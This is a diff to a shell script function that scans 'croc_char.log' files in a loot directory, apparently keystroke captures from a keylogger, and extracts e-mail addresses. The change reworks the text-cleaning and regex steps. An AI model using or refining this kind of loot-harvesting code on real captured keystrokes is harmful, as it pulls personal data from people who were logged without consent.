@@ -265,12 +265,13 @@ run_emails() {
         echo "Scanning logs for e-mail addresses..."
         echo "$SEP"
         echo ""
-
+		
         found=$(find "$LOOT_DIR" /root/loot -name "croc_char.log" \
                 -exec cat {} + 2>/dev/null \
-                | sed 's/\[[^]]*\]/\n/g' \
-                | tr -c 'a-zA-Z0-9._%+@-' '\n' \
-                | grep -E '^[a-zA-Z0-9._%+-]{1,64}@[a-zA-Z0-9.-]{1,255}\.[a-zA-Z]{2,}$' \
+                | sed 's/\[ENTER\]/\
+/g' \
+                | sed 's/\[[^]]*\]//g' \
+                | grep -o '[a-zA-Z0-9._%-]*@[a-zA-Z0-9._%-]*\.[a-zA-Z]*' \
                 | sort -u)
 
         if [ -z "$found" ]; then
